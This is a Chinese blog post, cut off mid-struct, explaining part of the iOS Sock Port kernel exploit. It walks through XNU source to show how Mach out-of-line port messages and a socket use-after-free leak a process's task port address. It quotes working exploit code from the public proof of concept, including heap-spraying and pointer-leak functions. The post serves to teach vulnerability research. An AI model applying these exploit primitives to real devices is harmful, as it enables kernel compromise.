---
title: Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address
date: 2019-11-24 20:00:00
tags: ['Sock Port', 'UAF', 'Mach', 'Mach Port']
---

# 系列文章
1. [iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying](https://juejin.im/post/5dd10660e51d453fac0a598d)

# 前言
在上一篇文章中，我们初步介绍了 UAF 原理，并提到了 iOS 10.0 - 12.2 的 Socket 代码中含有一个针对 `in6p_outputopts` 的 UAF Exploit，它是整个 Sock Port 漏洞的关键。从这篇文章开始，我们将逐行分析 [Sock Port 2 的 Public PoC 源码](https://github.com/jakeajames/sock_port/tree/sock_port_2)，并结合 XNU 源码进行深入分析和解释。

# Mach port 是什么
## 定义
在介绍 Sock Port 之前，我们需要先引入 Mach port 的概念[1]：
> Mach ports are a kernel-provided inter-process communication (IPC) mechanism used heavily throughout the operating system. A Mach port is a unidirectional, kernel-protected channel that can have multiple send endpoints and only one receive endpoint.

即 Mach ports 是内核提供的进程间通信机制，它被操作系统频繁的使用。一个 Mach port 是一个受内核保护的单向管道，它可以有多个发送端，但只能有一个接收端。

## Mach port 对应的内核对象
Mach port 在用户态以 `mach_port_t` 句柄的形式存在，在内核空间中每个 `mach_port_t` 句柄都有相对应的内核对象 `ipc_port`：
```c
struct ipc_port {
    struct ipc_object ip_object;
    struct ipc_mqueue ip_messages;
    
    union {
    	struct ipc_space *receiver;
    	struct ipc_port *destination;
    	ipc_port_timestamp_t timestamp;
    } data;
    
    union {
    	ipc_kobject_t kobject; // task
    	ipc_importance_task_t imp_task;
    	ipc_port_t sync_inheritor_port;
    	struct knote *sync_inheritor_knote;
    	struct turnstile *sync_inheritor_ts;
    } kdata;
// ...
```
其中比较关键的是 +0x68 处的 `kobject` 成员，它是一个 `task` 对象，根据 Apple 给出的文档：Task 是拥有资源的单位，它包含了虚拟地址空间、mach ports 空间以及线程空间[2]，它类似于进程的概念，在这里我们可以简单地理解为**每个进程都有其对应的 Task，内核通过 Task 可以管理进程资源，并通过这种机制实现进程间通信**。

## 内核中的 Task 对象
Task 在内核中的结构如下：
```c
struct task {
    // ...
    /* Virtual address space */
    vm_map_t	map;		/* Address space description */
    queue_chain_t	tasks;	/* global list of tasks */
    
    // ...
    /* Threads in this task */
    queue_head_t		threads;
    
    // ...
    /* Port right namespace */
    struct ipc_space *itk_space;
    
    /* Proc info */
    void *bsd_info;
    // ...
```
上述代码中的 `map`, `threads` 和 `itk_space` 分别对应了上述对 Task 拥有的虚拟地址空间、mach ports 命名空间以及线程空间，而 `bsd_info` 是一个 Proc 对象，它包含了当前进程信息，例如我们熟悉的 `PID`：

```c
struct	proc {
    LIST_ENTRY(proc) p_list;    /* List of all processes. */
    
    void * 		task;   /* corresponding task (static)*/
    pid_t		p_ppid; /* process's parent pid number */
    // ...
    pid_t		p_pid;  /* Process identifier. (static)*/
    // ...
```

## Port & Task 与进程的对应关系
在用户态我们可以通过 `mach_task_self_` 变量或是 `mach_task_self()` 宏函数拿到当前进程的 `Task port`，所谓 `Task port` 即是指包含了该进程对应的 `Task` 作为其 `kobject` 的任务端口，拥有该端口即可对相应的进程“为所欲为”。

因此，只要我们能在用户态获取到内核的 `Task port`，就能对内核为所欲为。Sock Port 本质上就是在用户态伪造了一个合法的内核 `Task port`（又被称之为 `task_for_pid(0)` ，即 `tfp0`）。

# Sock Port 概览
Sock Port 漏洞通过 Socket in6p_outputopts UAF 主要实现了 3 个 Exploit Primitive：
1. `mach_port` 句柄对应的 `ipc_port` 地址泄露，通过这种方式我们可以拿到应用自身进程的 `Task port`；
2. 借助于操作 `in6p_outputopts` 的成员实现了不稳定的内核内存读取；
3. 借助于操作 `in6p_outputopts` 的成员实现了内核中任意大小 zone 的释放。

Sock Port 通过组合这些 Primitive，先是通过 Socket UAF 获得了一个可控的内核地址空间，随后通过 Mach OOL Message 将这些空间填充成 `ipc_port` 的地址，最后偷梁换柱的用伪造的 `ipc_port` 对其进行替换，此时我们能够得到一个合法、可控的 `ipc_port`。

随后我们通过读取自身进程 `Task port` 的 `bsd_info` 以及 `task_prev` 枚举所有进程，直到 pid = 0 我们便拿到了 Kernel Task，从 Kernel Task 中取出 Kernel Map 赋予我们伪造的 `ipc_port`，此时我们便将伪造的 `ipc_port` 伪装成了一个真正的 `Kernel Task port`。

以上是对 Sock Port 的一个概述，详细的利用过程涉及到 XNU 的诸多知识，且每一步都富含细节，到这里读者只需要对该漏洞有个整体认识，在接下来的文章中会一步步分析这些 Primitive 的原理，以及组合 Primitives 实现 tfp0 的详细过程。

# 获取 Port Address 的思路
漏洞的第一个关键是获取到当前进程的 Task port 地址，这也是本文重点分析的内容。常规情况下，在用户态我们只能拿到 Task port 的句柄，若要拿到地址，有两个思路：
1. 泄露当前进程的 port 索引表，并通过句柄查询 port 的实际地址；
2. 通过某种方式迫使内核分配 Task port 的指针到我们可读的内核区域，即 UAF 方式。

事实上当前进程的 port 索引表是被 Task port 所间接引用的，即常规情况下我们需要先知道 Task port address 才能获取到 port 索引表的位置，因此方式 1 不可行。实现方式 2 的关键点有两个：UAF & 分配 Task port pointer，前者已经通过 Socket UAF 满足，现在只差后者。

## 迫使内核分配 Task port pointer
在 Sock Port 中有一段关键代码，用于为指定的 `target port` 句柄在内核中分配可控数量的 `ipc_port` 指针：
```c
// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}
```
这段代码所做的事情有三个：
1. 分配一个接收端口 q 用于接收 Mach OOL Message；
2. 构造一个 Mach OOL Message，并用想要获取地址的 `target port` 填充；
3. 向接收端口 q 发送 Mach Message，**由于 Mach Message 先经过内核，会在内核中对 OOL Message 进行复制，在复制过程中句柄会被转为地址**。

这个地方的一个关键是 OOL Message，它是触发内核复制的关键。OOL Message 的全称是 Out-of-line Message，之所以称之为 out of line，是因为它的消息体中包含了 Out-of-line Memory，而 Out-of-line Memory 即接收者虚拟地址空间以外的内容。根据 [GNU Doc](https://www.gnu.org/software/hurd/gnumach-doc/Memory.html)，Out-of-line Memory 会在接受者的空间进行 copyin 操作，**有意思的事情在于如果 out-of-line 的是 `mach_port` 句柄，在 copy 时会将其转换为句柄对应的 `ipc_port` 的地址**。

到这里我们已经了解了通过 OOL Message 迫使内核分配 port address 的方法，但知其然就要知其所以然，接下来我们从 XNU 源码入手分析着这整个过程。

# 从 XNU 源码分析 Mach OOL Message
笔者分析使用的 XNU 版本为 xnu-4903.221.2，分析时所在的 commit hash 为 a449c6a3b8014d9406c2ddbdc81795da24aa7443。

我们直接从发送消息的 `mach_msg` 函数入手分析，打断点可知 `mach_msg` 最终会调用到内核的 `mach_msg_trap` 函数，我们打开 XNU 源码可以看到 `mach_msg_trap` 其实是对 `mach_msg_overwrite_trap` 的简单封装：
```c
mach_msg_return_t
mach_msg_trap(
	struct mach_msg_overwrite_trap_args *args)
{
    kern_return_t kr;
    args->rcv_msg = (mach_vm_address_t)0;
    
    kr = mach_msg_overwrite_trap(args);
    return kr;
}
```

接下来我们去看 `mach_msg_overwrite_trap` 函数，首先看到函数的开头：
```c
mach_msg_return_t
mach_msg_overwrite_trap(
	struct mach_msg_overwrite_trap_args *args)
{
    mach_vm_address_t	msg_addr = args->msg;
    mach_msg_option_t	option = args->option;
    mach_msg_size_t	send_size = args->send_size;
    mach_msg_size_t	rcv_size = args->rcv_size;
    mach_port_name_t	rcv_name = args->rcv_name;
    mach_msg_timeout_t	msg_timeout = args->timeout;
    mach_msg_priority_t override = args->override;
    mach_vm_address_t	rcv_msg_addr = args->rcv_msg;
    __unused mach_port_seqno_t temp_seqno = 0;
    
    mach_msg_return_t  mr = MACH_MSG_SUCCESS;
    vm_map_t map = current_map();
    
    /* Only accept options allowed by the user */
    option &= MACH_MSG_OPTION_USER;
    
    if (option & MACH_SEND_MSG) {
        // ...
    }
    
    if (option & MACH_RCV_MSG) {
        // ...
    }
    
    // ...
```

先是从 args 中解出用户态传入的参数，随后准备了后续处理所需的环境，接下来的代码是对 option 的判断，可见收发消息共用了一个函数，由于我们传入的 option 包含了 `MACH_SEND_MSG`，接下来会走到消息发送的分支逻辑：
```c
if (option & MACH_SEND_MSG) {
    ipc_space_t space = current_space();
    ipc_kmsg_t kmsg;
    
    // 1. create kmsg and copy header
    mr = ipc_kmsg_get(msg_addr, send_size, &kmsg);
    
    if (mr != MACH_MSG_SUCCESS) {
    	return mr;
    }
    
    // 2. copy body
    mr = ipc_kmsg_copyin(kmsg, space, map, override, &option);
    
    if (mr != MACH_MSG_SUCCESS) {
    	ipc_kmsg_free(kmsg);
    	return mr;
    }
    
    // 3. send message
    mr = ipc_kmsg_send(kmsg, option, msg_timeout);
    
    if (mr != MACH_MSG_SUCCESS) {
    	mr |= ipc_kmsg_copyout_pseudo(kmsg, space, map, MACH_MSG_BODY_NULL);
    	(void) ipc_kmsg_put(kmsg, option, msg_addr, send_size, 0, NULL);
    	return mr;
    }
}
```
在消息发送的分支逻辑中有三个关键步骤：
1. 通过 mach message 创建一个 kmsg，kmsg 是 mach message 在内核中的数据结构；
2. 将 mach message body 复制到 kmsg 中；
3. 发送 kmsg。

下面我们将详细讲解前两个步骤，他们是整个 Mach OOL Message Spraying 的关键：

## 构造 kmsg
内核通过调用 `ipc_kmsg_get` 实现了 kmsg 构造，下面是 `ipc_kmsg_get` **去除了 debug 信息与一些判断逻辑外**的全貌：
```c
mach_msg_return_t
ipc_kmsg_get(
    mach_vm_address_t	msg_addr, // user space mach_msg_addr
    mach_msg_size_t	size, // send size = mach_msg_hdr->msgh_size = sizeof(mach_msg)
    ipc_kmsg_t		*kmsgp) // kmsg to return
{
    mach_msg_size_t		msg_and_trailer_size;
    ipc_kmsg_t 			kmsg;
    mach_msg_max_trailer_t	*trailer;
    mach_msg_legacy_base_t      legacy_base;
    mach_msg_size_t             len_copied;
    legacy_base.body.msgh_descriptor_count = 0;
    
    // 1. copy mach header & body to kernel legacy_base
    len_copied = sizeof(mach_msg_legacy_base_t);
    if (copyinmsg(msg_addr, (char *)&legacy_base, len_copied))
    	return MACH_SEND_INVALID_DATA;
    
    msg_addr += sizeof(legacy_base.header);
    // arm64 fixup
    size += LEGACY_HEADER_SIZE_DELTA;
    
    // 2. create a kmsg
    msg_and_trailer_size = size + MAX_TRAILER_SIZE;
    kmsg = ipc_kmsg_alloc(msg_and_trailer_size);
    if (kmsg == IKM_NULL)
    	return MACH_SEND_NO_BUFFER;
    
    // 2.1 init kernel mach_header
    kmsg->ikm_header->msgh_size	= size;
    kmsg->ikm_header->msgh_bits = legacy_base.header.msgh_bits;
    kmsg->ikm_header->msgh_remote_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_remote_port);
    kmsg->ikm_header->msgh_local_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_local_port);
    kmsg->ikm_header->msgh_voucher_port = legacy_base.header.msgh_voucher_port;
    kmsg->ikm_header->msgh_id = legacy_base.header.msgh_id;
    
    // 3. copy userspace mach body to kernel
    if (copyinmsg(msg_addr, (char *)(kmsg->ikm_header + 1), size - (mach_msg_size_t)sizeof(mach_msg_header_t))) {
    	ipc_kmsg_free(kmsg);
    	return MACH_SEND_INVALID_DATA;
    }
    
    // 4. init kmsg trailer
    trailer = (mach_msg_max_trailer_t *) ((vm_offset_t)kmsg->ikm_header + size);
    trailer->msgh_sender = current_thread()->task->sec_token;
    trailer->msgh_audit = current_thread()->task->audit_token;
    trailer->msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;
    trailer->msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;
    trailer->msgh_labels.sender = 0;
    
    *kmsgp = kmsg;
    return MACH_MSG_SUCCESS;
}
```

整个 kmsg 的构造过程较为复杂，主要包含了 4 步：
1. 在内核中新建一个 `mach_msg_legacy_base_t` 对象，它实际上是一个 mach_message 的基本结构，随后将用户空间的 mach header 和 body 通过 `copyinmsg` 复制到 `mach_msg_legacy_base_t` 对象，主要目的是在方便在内核中获取消息的 mach 数据结构；
```c
typedef struct
{
    mach_msg_legacy_header_t    header;
    mach_msg_body_t             body;
} mach_msg_legacy_base_t;
```
2. 创建一个 kmsg 数据结构，kmsg 包含了 mach 消息的全部数据，并包含了额外的 buffer 来兼容 64 位系统向 32 位系统发送消息的情况；
3. 将用户空间的 mach 消息体拷贝到 kmsg；
4. 初始化 kmsg 的 trailler，trailler 是一个位于 kmsg 尾部的变长数据结构，用于携带一些额外信息。

这部分最复杂的部分是第 2 步 kmsg 的创建，其复杂性在于对整个 kmsg 空间的构造，涉及大量的地址与尺寸计算，由于整个过程十分冗长无聊，这里直接给出结论，有兴趣的读者可以顺着方法自己构造一遍整个 kmsg 数据体。

```c
/***
 *  |-kmsg(84)-|---body(60)---|-mach_msg_hdr(24)-|-mach_msg_body(4)-|-descriptor(16)-|-trailer(0x44)-|
 *      |                       ^
 *      |                       |
 *   ikm_header ----------------|
 */
```

可见用户空间发送的 mach message 结构被放置在了 kmsg body 后面，包含 header, body 和 descriptor 三部分，随后跟着一个 trailer。

事实上，body 区域是被预留的，用于处理 kmsg 无法完整容纳下 descriptor 的情况，这一点在 `ipc_kmsg_alloc` 开头的注释中可以看到：
```c
/*
 * LP64support -
 * Pad the allocation in case we need to expand the
 * message descrptors for user spaces with pointers larger than
 * the kernel's own, or vice versa.  We don't know how many descriptors
 * there are yet, so just assume the whole body could be
 * descriptors (if there could be any at all).
 *
 * The expansion space is left in front of the header,
 * because it is easier to pull the header and descriptors
 * forward as we process them than it is to push all the
 * data backwards.
 */
```

即当用户空间的 descriptor 比内核空间大时，我们可以将 kmsg 从 `mach_msg_header` 开始整体左移，为 descriptor 空出空间。之所以在左侧预留空间是因为 kmsg 后面的内存空间可能已被占用，将 header 向前拉要比向后推动要更简单。

## 将用户空间的 mach message 剩余部分复制到 kmsg
构造好了 kmsg 以后，我们只完成了 header 和 body 的复制，其中 body 包含了 descriptor 的信息，接下来的工作是通过 `ipc_kmsg_copyin` 函数赋值余下的部分，并为 OOL Message 中的 OOL Memory 转化为 in-line memory。

我们先来看 `ipc_kmsg_copyin` 的实现：
```c
mach_msg_return_t
ipc_kmsg_copyin(
	ipc_kmsg_t		kmsg,
	ipc_space_t		space,
	vm_map_t		map,
	mach_msg_priority_t     override,
	mach_msg_option_t	*optionp)
{
    mach_msg_return_t mr;
    
    kmsg->ikm_header->msgh_bits &= MACH_MSGH_BITS_USER;
    
    // 1. copy header rights
    mr = ipc_kmsg_copyin_header(kmsg, space, override, optionp);
    
    if (mr != MACH_MSG_SUCCESS)
    return mr;
    
    if ((kmsg->ikm_header->msgh_bits & MACH_MSGH_BITS_COMPLEX) == 0)
        return MACH_MSG_SUCCESS;
    
    // 2. copy body
    mr = ipc_kmsg_copyin_body(kmsg, space, map, optionp);
    
    return mr;
}
```

这里主要包含两个步骤：
1. 复制用户空间的 mach message rights 到 kmsg，这里的 rights 指的是 port 的发送和接收能力；
2. 复制 descriptor 到 kmsg，并根据 descriptor 对 OOL Memory 创建相应的内核空间完成地址空间的转换。

这里重点讲一下步骤 2，它是能迫使内核完成从 port 句柄到 port address 转换和指针分配的关键，下面是笔者**在 arm64 和 上述 OOL Message 方式调用条件下去掉一些边界判断后精简的** `ipc_kmsg_copyin_body` 内容：
```c
mach_msg_return_t
ipc_kmsg_copyin_body(
	ipc_kmsg_t	kmsg,
	ipc_space_t	space,
	vm_map_t    map,
	mach_msg_option_t *optionp)
{
    ipc_object_t dest;
    mach_msg_body_t	*body;
    mach_msg_descriptor_t *user_addr, *kern_addr;
    mach_msg_type_number_t dsc_count;
    boolean_t is_task_64bit = (map->max_offset > VM_MAX_ADDRESS);
    boolean_t complex = FALSE;
    vm_size_t space_needed = 0;
    vm_offset_t	paddr = 0;
    vm_map_copy_t copy = VM_MAP_COPY_NULL;
    mach_msg_type_number_t i;
    mach_msg_return_t mr = MACH_MSG_SUCCESS;
    
    // 1. init descriptor size
    vm_size_t descriptor_size = 0;
    
    dest = (ipc_object_t) kmsg->ikm_header->msgh_remote_port;
    body = (mach_msg_body_t *) (kmsg->ikm_header + 1);
    dsc_count = body->msgh_descriptor_count;
    
    /*
     * Make an initial pass to determine kernal VM space requirements for
     * physical copies and possible contraction of the descriptors from
     * processes with pointers larger than the kernel's.
     */
    daddr = NULL;
    for (i = 0; i < dsc_count; i++) {
        /* make sure the descriptor fits in the message */
        descriptor_size += 16;
    }
    
    /*
     * Allocate space in the pageable kernel ipc copy map for all the
     * ool data that is to be physically copied.  Map is marked wait for
     * space.
     */
    if (space_needed) {
        if (vm_allocate_kernel(ipc_kernel_copy_map, &paddr, space_needed,
                    VM_FLAGS_ANYWHERE, VM_KERN_MEMORY_IPC) != KERN_SUCCESS) {
            mr = MACH_MSG_VM_KERNEL;
            goto clean_message;
        }
    }
    
    /* user_addr = just after base as it was copied in */
    user_addr = (mach_msg_descriptor_t *)((vm_offset_t)kmsg->ikm_header + sizeof(mach_msg_base_t));
    
    // 2. pull header forward if needed
    /* Shift the mach_msg_base_t down to make room for dsc_count*16bytes of descriptors */
    if (descriptor_size != 16 * dsc_count) {
        vm_offset_t dsc_adjust = 16 * dsc_count - descriptor_size;
        memmove((char *)(((vm_offset_t)kmsg->ikm_header) - dsc_adjust), kmsg->ikm_header, sizeof(mach_msg_base_t));
        kmsg->ikm_header = (mach_msg_header_t *)((vm_offset_t)kmsg->ikm_header - dsc_adjust);
        /* Update the message size for the larger in-kernel representation */
        kmsg->ikm_header->msgh_size += (mach_msg_size_t)dsc_adjust;
    }
    
    /* kern_addr = just after base after it has been (conditionally) moved */
    kern_addr = (mach_msg_descriptor_t *)((vm_offset_t)kmsg->ikm_header + sizeof(mach_msg_base_t));
    
    // 3. copy ool ports to kernel zone
    /* handle the OOL regions and port descriptors. */
    for (i = 0; i < dsc_count; i++) {
        user_addr = ipc_kmsg_copyin_ool_ports_descriptor((mach_msg_ool_ports_descriptor_t *)kern_addr, 
    			            user_addr, is_task_64bit, map, space, dest, kmsg, optionp, &mr);
        kern_addr++;
        complex = TRUE;    
    }
    
    if (!complex) {
        kmsg->ikm_header->msgh_bits &= ~MACH_MSGH_BITS_COMPLEX;
    }
    
    return mr;
```
这个函数较为复杂，笔者在其中用注释标出了 3 个关键步骤：
1. 初始化 descriptor size，它是 `mach_msg_ool_ports_descriptor_t` 的用户空间大小；
2. 如果发现 kmsg 容纳不了用户空间的 `mach_msg_ool_ports_descriptor_t`，将 kmsg 从 header 开始整体往前移动，为 descriptor 留下足够的空间，这与上文中提到的 kmsg body expand size 描述一致；
3. 将 ool ports 拷贝到内核地址空间，这其中包含了从 port 句柄到 ipc_port address 的转换。

由于我们的 body 只包含了一个 descriptor，且用户空间尺寸与内核空间中一致，因此不需要 pull header forward，接下来我们终于来到了本文的重头戏：ool ports 转换。

port 句柄到地址的转换是通过调用 `ipc_kmsg_copyin_ool_ports_descriptor` 函数完成的，下面我们看一下该函数的实现：
```c
mach_msg_descriptor_t *
ipc_kmsg_copyin_ool_ports_descriptor(
	mach_msg_ool_ports_descriptor_t *dsc,
	mach_msg_descriptor_t *user_dsc,
	int is_64bit,
	vm_map_t map,
	ipc_space_t space,
	ipc_object_t dest,
	ipc_kmsg_t kmsg,
	mach_msg_option_t *optionp,
	mach_msg_return_t *mr)
{
    void *data;
    ipc_object_t *objects;
    unsigned int i;
    mach_vm_offset_t addr;
    mach_msg_type_name_t user_disp;
    mach_msg_type_name_t result_disp;
    mach_msg_type_number_t count;
    mach_msg_copy_options_t copy_option;
    boolean_t deallocate;
    mach_msg_descriptor_type_t type;
    vm_size_t ports_length, names_length;
    
    mach_msg_ool_ports_descriptor64_t *user_ool_dsc = (typeof(user_ool_dsc))user_dsc;
    addr = (mach_vm_offset_t)user_ool_dsc->address;
    count = user_ool_dsc->count;
    deallocate = user_ool_dsc->deallocate;
    copy_option = user_ool_dsc->copy;
    user_disp = user_ool_dsc->disposition;
    type = user_ool_dsc->type;
    
    user_dsc = (typeof(user_dsc))(user_ool_dsc+1);
    
    dsc->deallocate = deallocate;
    dsc->copy = copy_option;
    dsc->type = type;
    dsc->count = count;
    dsc->address = NULL;  /* for now */
    
    result_disp = ipc_object_copyin_type(user_disp);
    dsc->disposition = result_disp;
    
    // 1. calculate port_pointers length and port_names length
    /* calculate length of data in bytes, rounding up */
    if (os_mul_overflow(count, sizeof(mach_port_t), &ports_length)) {
        *mr = MACH_SEND_TOO_LARGE;
        return NULL;
    }
    if (os_mul_overflow(count, sizeof(mach_port_name_t), &names_length)) {
        *mr = MACH_SEND_TOO_LARGE;
        return NULL;
    }
    
    // 2. alloc kenrel zone for port pointers
    data = kalloc(ports_length);
    mach_port_name_t *names = &((mach_port_name_t *)data)[count];
    if (copyinmap(map, addr, names, names_length) != KERN_SUCCESS) {
        kfree(data, ports_length);
        *mr = MACH_SEND_INVALID_MEMORY;
        return NULL;
    }
    
    if (deallocate) {
        (void) mach_vm_deallocate(map, addr, (mach_vm_size_t)ports_length);
    }
    
    objects = (ipc_object_t *) data;
    // 3. 替换 ool address 为 kernel address
    dsc->address = data;
    
    for ( i = 0; i < count; i++) {
        mach_port_name_t name = names[i];
        ipc_object_t object;
    
        if (!MACH_PORT_VALID(name)) {
            objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);
            continue;
        }
        
        // 4. convert port_name to port_addr
        kern_return_t kr = ipc_object_copyin(space, name, user_disp, &object);
    
        if (kr != KERN_SUCCESS) {
            unsigned int j;
    
            for(j = 0; j < i; j++) {
                object = objects[j];
                if (IPC_OBJECT_VALID(object))
                    ipc_object_destroy(object, result_disp);
            }
            kfree(data, ports_length);
            dsc->address = NULL;
    		if ((*optionp & MACH_SEND_KERNEL) == 0) {
    			mach_port_guard_exception(name, 0, 0, kGUARD_EXC_SEND_INVALID_RIGHT);
    		}
            *mr = MACH_SEND_INVALID_RIGHT;
            return NULL;
        }
    
        if ((dsc->disposition == MACH_MSG_TYPE_PORT_RECEIVE) &&
                ipc_port_check_circularity(
                    (ipc_port_t) object,
                    (ipc_port_t) dest))
            kmsg->ikm_header->msgh_bits |= MACH_MSGH_BITS_CIRCULAR;
    
        objects[i] = object;
    }
    
    return user_dsc;
}
```
这段代码同样十分复杂，笔者在其中标出了 4 个关键步骤：
1. 计算 `ipc_port pointer` 所需要的空间大小，以及用户空间中 `mach_port`  句柄数组的大小；
2. 在内核中分配空间用于容纳从句柄数组转换而来的 `ipc_port pointer` 数组，这个地方的 `ports_length` 有些费解，理论上应该计算 `count * sizeof(mach_port_t *)`，如果采用 `count * sizeof(mach_port_t)` 作为 kalloc 参数如何能装下 pointers 呢？是不是 kalloc 有一些特殊的内存分配规则，望高人指点；
3. 替换 kmsg 中的 ool address 为步骤 2 中分配的 kernel address；
4. 完成从 port 句柄到 port address 的转换。

这其中的重点是步骤 4，它通过调用 `ipc_object_copyin` 将一个句柄转化为 `ipc_port pointer`，我们来看它的实现：
```c
kern_return_t
ipc_object_copyin(
	ipc_space_t		space,
	mach_port_name_t	name,
	mach_msg_type_name_t	msgt_name,
	ipc_object_t		*objectp)
{
    ipc_entry_t entry;
    ipc_port_t soright;
    ipc_port_t release_port;
    kern_return_t kr;
    int assertcnt = 0;

    // 1. find port in is_table
    kr = ipc_right_lookup_write(space, name, &entry);
    if (kr != KERN_SUCCESS)
        return kr;
    
    release_port = IP_NULL;
    // 2. copy to kernel ipc_object
    kr = ipc_right_copyin(space, name, entry,
    		      msgt_name, TRUE,
    		      objectp, &soright,
    		      &release_port,
    		      &assertcnt);
    // ...
    
    return kr;
}
```

这里主要有两个关键步骤：
1. 在当前 IPC Space 的 port 索引表中根据 port_name 获取到 port address；
2. 将 port right 拷贝到内核中的 ipc_object 对象返回。

这里的关键是第 1 步，它通过 `ipc_right_lookup_write` 实现了句柄到地址的转换，它是对 `ipc_entry_lookup` 的封装，我们直接看后者的实现：
```c
ipc_entry_t
ipc_entry_lookup(
	ipc_space_t		space,
	mach_port_name_t	name)
{
    mach_port_index_t index;
    ipc_entry_t entry;
    
    assert(is_active(space));
    
    // 1. get index from port name
    index = name >> 8;
    if (index <  space->is_table_size) {
        // 2. get port address by index from is_table
        entry = &space->is_table[index];
    	if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||
    	    IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE) {
    		entry = IE_NULL;		
    	}
    }
    else {
    	entry = IE_NULL;
    }
    
    assert((entry == IE_NULL) || IE_BITS_TYPE(entry->ie_bits));
    return entry;
}
```

从这里我们可以看到，port 句柄中的索引信息是从第 8 位开始的，因此将 port name 右移 8 位即可得到 port index，随后在索引表中查找地址返回。

到这里我们已经全然明白了为何能通过发送 Mach OOL Message 实现迫使内核分配指定 port 的 `ipc_port pointers` 的原理，接下来我们着手分析如何获取到这个地址。

# 通过 OOL Message 与 Socket UAF 获取 Port Address
到这里思路变得十分明确，我们只需要利用 Socket UAF 得到一块已释放区域，然后发送大量的 OOL Message 消息，且使得 port 数组与被释放区域大小一致，即可通过 Heap Spraying 将 `ipc_port pointer` 数组分配在已释放区域，下面我们来看 Sock Port 中的这段代码：

```c
// first primitive: leak the kernel address of a mach port
uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
    // here we use the uaf as an info leak
    // 1. make dangling socket option zone
    int sock = get_socket_with_dangling_options();
    
    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        
        // 2. send ool message
        mach_port_t p = fill_kalloc_with_port_pointer(port, 192/sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
        
        int mtu;
        int pref;
        
        // 3. get option and check if it is a kernel pointer
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
        
        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)
        
        /*  from a hex dump:
         
         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */
        
        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up
        
        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }
    
    // close that socket.
    close(sock);
    return 0;
}
```
这里有 4 个关键步骤：
1. 利用 Socket UAF 制造一个 `in6p_outputopts` 大小的已释放区域，详细过程可以看上一篇文章：[iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying](https://juejin.im/post/5dd10660e51d453fac0a598d) 或 [Sock Port Write-up](https://github.com/jakeajames/sock_port/blob/master/sock_port.pdf)；
2. 发送 ool message，由于 `in6p_outputopts` 的大小为 192B，一个 port pointer 大小为 8B，因此我们需要发送 192 / 8 = 24 个 ool_ports；
3. 通过 `in6p_outputopts` 两个连续的成员变量拼接出一个 64 位地址；
4. 判断步骤 3 中得到的地址是否是内核对象指针，如果是内核对象指针，说明我们成功了，该地址就是 target port 的地址。

这里我们重点讲一下第 3、4 步：
## 通过 Socket Option 读取一个 8B 区域
根据 `in6p_outputopts` 对应的结构体：
```c
struct	ip6_pktopts {
    struct	mbuf *ip6po_m;	
    int	        ip6po_hlim;	
    struct	in6_pktinfo *ip6po_pktinfo;
    struct	ip6po_nhinfo ip6po_nhinfo;
    struct	ip6_hbh *ip6po_hbh; 
    struct	ip6_dest *ip6po_dest1;
    struct	ip6po_rhinfo ip6po_rhinfo;
    struct	ip6_dest *ip6po_dest2;
    int	ip6po_tclass;
    int	ip6po_minmtu; // +180
